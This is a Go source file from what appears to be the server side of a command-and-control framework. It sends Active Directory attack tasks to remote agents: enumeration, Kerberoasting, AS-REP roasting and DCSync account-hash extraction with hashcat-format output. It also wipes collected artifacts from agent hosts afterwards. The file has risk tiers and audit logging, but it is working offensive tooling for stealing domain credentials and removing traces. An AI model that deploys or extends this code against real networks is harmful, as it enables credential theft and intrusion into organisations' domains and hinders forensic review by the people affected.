package services

import (
	"encoding/json"
	"fmt"
	"log"
	"path/filepath"
	"strings"
	"time"

	guuid "github.com/google/uuid"

	"cupcake-server/pkg/globals"
	"cupcake-server/internal/model"
	"cupcake-server/internal/storage"
)

// isAdTaskReqID returns true only for AD module correlation IDs.
// Regular commands use other prefixes (MOD-*, MODLIST-*, FS-*, PROC-*, CMD-*, etc.).
// Guard prevents noisy "record not found" queries against ad_tasks for every response.
func isAdTaskReqID(reqID string) bool {
	return strings.HasPrefix(reqID, "AD-")
}

// AdCommandTypes is the authoritative list of AD module command types
// (must match Client/core/src/module_loader.rs AD_COMMAND_TYPES).
var AdCommandTypes = map[string]bool{
	"ad_discover":                 true,
	"ad_ldap_query":               true,
	"ad_enum_users":               true,
	"ad_enum_groups":              true,
	"ad_enum_privileged_groups":   true,
	"ad_enum_computers":           true,
	"ad_enum_spns":                true,
	"ad_enum_trusts":              true,
	"ad_password_policy":          true,
	"ad_enum_delegation":          true,
	"ad_enum_gpo":                 true,
	"ad_collect_sessions":         true,
	"kerberoast":                  true,
	"asrep_roast":                 true,
	"dcsync":                      true,
	"ad_check_replication_rights": true,
	"ad_graph_collect":            true,
	"ad_acl_collect":              true,
	"ad_ping":                     true,
}

// IsAdCommand returns true if the command type is an AD module command.
func IsAdCommand(commandType string) bool {
	return AdCommandTypes[commandType]
}

// DefaultAdDeadline returns the default wall-clock deadline for an AD op.
// Maps to docs/AD_MODULE_DESIGN.md 附录 A.
func DefaultAdDeadline(op string) time.Duration {
	switch op {
	case "ad_discover":
		return 30 * time.Second
	case "ad_ldap_query":
		return 60 * time.Second
	case "ad_enum_users", "ad_enum_groups", "ad_enum_computers":
		return 120 * time.Second
	case "ad_enum_privileged_groups", "ad_enum_spns", "ad_enum_delegation", "ad_enum_gpo":
		return 60 * time.Second
	case "ad_enum_trusts":
		return 30 * time.Second
	case "ad_password_policy":
		return 15 * time.Second
	case "ad_collect_sessions":
		return 180 * time.Second
	case "kerberoast":
		return 180 * time.Second
	case "asrep_roast":
		return 120 * time.Second
	case "ad_check_replication_rights":
		return 30 * time.Second
	case "dcsync":
		return 300 * time.Second
	case "ad_graph_collect":
		return 300 * time.Second
	case "ad_acl_collect":
		return 180 * time.Second
	case "ad_ping":
		return 15 * time.Second
	default:
		return 60 * time.Second
	}
}

// RiskLevelForOp returns the risk level for an AD operation.
func RiskLevelForOp(op string) string {
	switch op {
	case "dcsync":
		return "critical"
	case "kerberoast", "asrep_roast":
		return "high"
	case "ad_collect_sessions":
		return "medium"
	default:
		return "low"
	}
}

// SendAdCommand dispatches an AD module command to an agent.
// Creates an AdTask record, sends the command, and returns the task.
// High-risk ops (e.g. dcsync) are gated via CheckHighRiskCommand before any
// agent I/O (KD-8 / KD-20). role/isMCP come from the HTTP/MCP principal.
func SendAdCommand(uuid, commandType, paramsJSON string, deadlineMs int64, role string, isMCP bool) (*model.AdTask, error) {
	if !IsAdCommand(commandType) {
		return nil, fmt.Errorf("invalid ad command type: %s", commandType)
	}

	if paramsJSON == "" {
		paramsJSON = "{}"
	}

	// Full-path high-risk gate (must run before offline check is optional — fail closed first).
	if err := CheckHighRiskCommand(commandType, role, isMCP, paramsJSON); err != nil {
		return nil, err
	}

	val, ok := globals.Clients.Load(uuid)
	if !ok {
		return nil, fmt.Errorf("agent offline")
	}
	client := val.(*globals.Client)

	// Capability gate (模块能力): product module "ad" must be loaded before AD ops.
	// UI/MCP parse code=module_required / error_code=module_required.
	if !GetModuleService().AgentHasModule(uuid, "ad") {
		return nil, ModuleRequiredError("ad", "AD 功能需要先在「模块」页向该主机推送 ad 模块")
	}

	// Include random suffix: counter alone resets on process restart and collides with
	// historical ad_tasks.req_id (UNIQUE) after reboot.
	reqID := fmt.Sprintf("AD-%d-%s", globals.GetNextReqID(), guuid.NewString()[:8])
	op := commandType
	if op == "ad_ping" {
		op = "ping"
	}

	deadline := time.Duration(deadlineMs) * time.Millisecond
	if deadlineMs <= 0 {
		deadline = DefaultAdDeadline(commandType)
		if op == "ping" {
			deadline = DefaultAdDeadline("ad_ping")
		}
	}

	// Build the command payload as JSON that the agent handler will parse.
	// The agent handler (handler.rs) reads command_content as the params JSON.
	content := fmt.Sprintf(`{"op":"%s","params":%s,"deadline_ms":%d}`, op, paramsJSON, deadline.Milliseconds())

	msg := globals.MessageWrapper{
		MsgType: "command",
		Payload: globals.CommandPayload{
			CommandType:    commandType,
			CommandContent: content,
			ReqID:          reqID,
		},
	}

	createdBy := strings.TrimSpace(role)
	if createdBy == "" {
		createdBy = "operator"
	}
	if isMCP {
		createdBy = "mcp"
	}

	// Create AdTask record (auditable)
	task := &model.AdTask{
		AgentUUID:  uuid,
		ReqID:      reqID,
		Op:         op,
		Status:     "pending",
		RiskLevel:  RiskLevelForOp(op),
		ParamsJSON: paramsJSON,
		CreatedBy:  createdBy,
	}


	if err := store.CreateAdTask(task); err != nil {
		return nil, fmt.Errorf("create ad task: %w", err)
	}

	if err := WriteEncryptedMessage(client, msg); err != nil {
		_ = store.UpdateAdTaskStatus(reqID, "failed", "send_error")
		return nil, fmt.Errorf("send ad command: %w", err)
	}

	// Mark as running
	_ = store.UpdateAdTaskStatus(reqID, "running", "")
	log.Printf("[ad] dispatched %s op=%s agent=%s req=%s role=%s", commandType, op, uuid, reqID, createdBy)

	return task, nil
}

// HandleAdResponse processes an AD module response from the agent.
// Called by the response handler when a response with req_id matching an AD task arrives.
// Large / roast / graph results are redacted for logs; artifact metadata stored on AdTask.
//
// Only AD-* reqIDs are valid for ad_tasks. All other prefixes (MOD-*, MODLIST-*, FS-*,
// PROC-*, CMD-*, PL-*, MIG-*, etc.) are regular commands and must never query ad_tasks.
func HandleAdResponse(reqID, stdout, stderr string) {
	// Fast path guard: non-AD reqIDs are never AD tasks.
	// This prevents "record not found" spam in logs for every module/plugin/command response.
	if !isAdTaskReqID(reqID) {
		return
	}

	// Look up the AD task (GetAdTaskByReqID returns (nil, nil) for "not found" — no error)
	task, _ := store.GetAdTaskByReqID(reqID)
	if task == nil {
		// Not an AD task — may be a regular command response (should be rare after guard)
		return
	}

	if stderr != "" {
		// Soft domain codes still complete as failed with stable error_code
		errorCode := stderr
		if idx := strings.Index(stderr, ":"); idx > 0 && idx < 40 {
			// keep full for store; error_code column may hold first token
			_ = idx
		}
		_ = store.UpdateAdTaskStatus(reqID, "failed", errorCode)
		log.Printf("[ad] task %s failed: %s", reqID, stderr)
		return
	}

	summary, _ := ParseAdSummary(stdout)
	safe := SanitizeSummaryForLog(stdout)

	artifactPath := ""
	artifactSHA := ""
	var artifactBytes int64

	if NeedsArtifactStorage(summary, len(stdout), DefaultAdStdoutInlineMax) {
		_ = store.UpdateAdTaskStatus(reqID, "collecting_artifact", "")
		// Prefer agent-declared path name as filename hint; content is summary-only here.
		// Full FILE 0x0E pull is orchestrated when agent path is reachable; until then
		// we persist redacted summary + meta so UI can download when bytes land.
		filename := "result.json"
		if summary != nil && summary.ArtifactPath != "" {
			filename = filepath.Base(summary.ArtifactPath)
			if filename == "." || filename == "/" || filename == "" {
				filename = "result.bin"
			}
		}
		if summary != nil && strings.Contains(summary.Format, "hashcat") {
			filename = "result.hashcat.txt"
		}
		if summary != nil && (strings.Contains(summary.Format, "zip") || strings.Contains(summary.Format, "graph") || task.Op == "ad_graph_collect") {
			filename = "graph.zip"
		}
		// Prefer real bytes:
		// 1) extract/build cupcake graph from full stdout → graph.zip (PK header)
		// 2) non-artifact small stdout → store raw
		// 3) else → sanitized summary placeholder (never fake .zip)
		payload := []byte(safe)
		if gExtract, gerr := ExtractCupcakeGraphFromJSONBytes([]byte(stdout)); gerr == nil && gExtract != nil && len(gExtract.Nodes) > 0 {
			if raw, merr := json.Marshal(gExtract); merr == nil {
				if zipBytes, zerr := BuildCupcakeGraphZipFromJSON(raw); zerr == nil && len(zipBytes) > 0 {
					payload = zipBytes
					filename = "graph.zip"
				} else {
					payload = raw
					filename = "graph.json"
				}
				_, _, _, _ = WriteAdArtifact(task.AgentUUID, fmt.Sprintf("%d", task.ID), "summary.json", []byte(safe))
			}
		} else if summary != nil && len(summary.Graph) > 2 && string(summary.Graph) != "null" {
			if zipBytes, zerr := BuildCupcakeGraphZipFromJSON(summary.Graph); zerr == nil && len(zipBytes) > 0 {
				payload = zipBytes
				filename = "graph.zip"
			} else {
				payload = summary.Graph
				filename = "graph.json"
			}
			_, _, _, _ = WriteAdArtifact(task.AgentUUID, fmt.Sprintf("%d", task.ID), "summary.json", []byte(safe))
		} else if summary != nil && !summary.Artifact && len(stdout) <= DefaultAdStdoutInlineMax {
			payload = []byte(stdout)
		} else if summary != nil && summary.Artifact && looksLikeJSONSummary(payload) && strings.HasSuffix(strings.ToLower(filename), ".zip") {
			filename = "result.summary.json"
			payload = []byte(safe)
			if len(stdout) > 0 && len(stdout) <= DefaultAdStdoutInlineMax {
				// Keep full stdout (may include dcs[]) for later reconstruct
				payload = []byte(stdout)
			}
		}
		rel, sha, n, werr := WriteAdArtifact(task.AgentUUID, fmt.Sprintf("%d", task.ID), filename, payload)
		if werr != nil {
			log.Printf("[ad] artifact write failed req=%s: %v", reqID, werr)
		} else {
			artifactPath = rel
			artifactSHA = sha
			artifactBytes = n
			_ = WriteAdMetaJSON(task.AgentUUID, fmt.Sprintf("%d", task.ID), map[string]interface{}{
				"req_id":   reqID,
				"op":       task.Op,
				"sha256":   sha,
				"bytes":    n,
				"filename": filename,
			})
		}
		// Queue Stage0 wipe for agent temp path when declared
		if summary != nil && summary.ArtifactPath != "" {
			queueAdArtifactWipe(task.AgentUUID, summary.ArtifactPath)
		}
	}

	_ = store.UpdateAdTaskResult(reqID, safe, artifactPath, artifactSHA, artifactBytes)
	log.Printf("[ad] task %s completed (op=%s artifact=%v)", reqID, task.Op, artifactPath != "")
}

// queueAdArtifactWipe best-effort: send ad_artifact_wipe for agent temp path.
func queueAdArtifactWipe(agentUUID, path string) {
	val, ok := globals.Clients.Load(agentUUID)
	if !ok {
		return
	}
	client := val.(*globals.Client)
	reqID := fmt.Sprintf("ADW-%d", globals.GetNextReqID())
	content := fmt.Sprintf(`{"path":%q}`, path)
	msg := globals.MessageWrapper{
		MsgType: "command",
		Payload: globals.CommandPayload{
			CommandType:    "ad_artifact_wipe",
			CommandContent: content,
			ReqID:          reqID,
		},
	}
	if err := WriteEncryptedMessage(client, msg); err != nil {
		log.Printf("[ad] wipe dispatch failed agent=%s: %v", agentUUID, err)
	}
}

// ListAdCapabilities returns the schema of available AD operations (for UI forms).
func ListAdCapabilities() []map[string]interface{} {
	ops := []map[string]interface{}{
		{
			"op":          "ad_discover",
			"tier":        0,
			"label":       "DC / 域发现",
			"risk":        "low",
			"description": "发现域控制器、站点、功能级别",
			"default_deadline_ms": 30000,
		},
		{
			"op":          "ad_ldap_query",
			"tier":        0,
			"label":       "LDAP 查询",
			"risk":        "low",
			"description": "自定义 LDAP 查询（base, filter, attrs）",
			"default_deadline_ms": 60000,
		},
		{
			"op":          "ad_enum_users",
			"tier":        0,
			"label":       "用户枚举",
			"risk":        "low",
			"description": "枚举域用户",
			"default_deadline_ms": 120000,
		},
		{
			"op":          "ad_enum_groups",
			"tier":        0,
			"label":       "组枚举",
			"risk":        "low",
			"description": "枚举域组",
			"default_deadline_ms": 120000,
		},
		{
			"op":          "ad_enum_privileged_groups",
			"tier":        0,
			"label":       "特权组快照",
			"risk":        "low",
			"description": "关注 Domain/Enterprise Admins 等高特权组",
			"default_deadline_ms": 60000,
		},
		{
			"op":          "ad_enum_computers",
			"tier":        0,
			"label":       "计算机枚举",
			"risk":        "low",
			"description": "枚举域计算机",
			"default_deadline_ms": 120000,
		},
		{
			"op":          "ad_enum_spns",
			"tier":        0,
			"label":       "SPN 枚举",
			"risk":        "low",
			"description": "枚举服务主体名称",
			"default_deadline_ms": 60000,
		},
		{
			"op":          "ad_enum_trusts",
			"tier":        0,
			"label":       "信任关系",
			"risk":        "low",
			"description": "枚举域信任关系",
			"default_deadline_ms": 30000,
		},
		{
			"op":          "ad_password_policy",
			"tier":        0,
			"label":       "密码策略",
			"risk":        "low",
			"description": "获取域密码策略",
			"default_deadline_ms": 15000,
		},
		{
			"op":          "ad_enum_delegation",
			"tier":        0,
			"label":       "委派发现",
			"risk":        "low",
			"description": "发现非约束/约束/RBCD 委派",
			"default_deadline_ms": 60000,
		},
		{
			"op":          "ad_enum_gpo",
			"tier":        0,
			"label":       "GPO 线索",
			"risk":        "low",
			"description": "枚举组策略对象",
			"default_deadline_ms": 60000,
		},
		{
			"op":          "ad_collect_sessions",
			"tier":        0,
			"label":       "会话采集",
			"risk":        "medium",
			"description": "采集会话/本地管理员信息（高噪声；默认关）",
			"default_deadline_ms": 180000,
		},
		{
			"op":          "kerberoast",
			"tier":        1,
			"label":       "Kerberoast",
			"risk":        "high",
			"description": "请求 TGS 票据并导出 hashcat 格式 hash",
			"default_deadline_ms": 180000,
		},
		{
			"op":          "asrep_roast",
			"tier":        1,
			"label":       "AS-REP Roast",
			"risk":        "high",
			"description": "对无预认证用户请求 AS-REP 并导出 hash",
			"default_deadline_ms": 120000,
		},
		{
			"op":          "dcsync",
			"tier":        2,
			"label":       "DCSync",
			"risk":        "critical",
			"description": "模拟 DC 复制拉取账户哈希（admin+confirm）",
			"default_deadline_ms": 300000,
		},
		{
			"op":          "ad_check_replication_rights",
			"tier":        2,
			"label":       "复制权限探测",
			"risk":        "low",
			"description": "探测当前用户是否有 DCSync 复制权限",
			"default_deadline_ms": 30000,
		},
		{
			"op":          "ad_graph_collect",
			"tier":        3,
			"label":       "图采集",
			"risk":        "medium",
			"description": "采集 AD 对象/ACL/会话（导出 graph.zip）",
			"default_deadline_ms": 300000,
		},
		{
			"op":          "ad_acl_collect",
			"tier":        3,
			"label":       "ACL 聚焦",
			"risk":        "medium",
			"description": "采集指定目标的 ACL 信息",
			"default_deadline_ms": 180000,
		},
		{
			"op":          "ad_ping",
			"tier":        0,
			"label":       "Worker Ping",
			"risk":        "low",
			"description": "探测 AD worker 是否存活（脚手架）",
			"default_deadline_ms": 15000,
		},
	}
	return ops
}
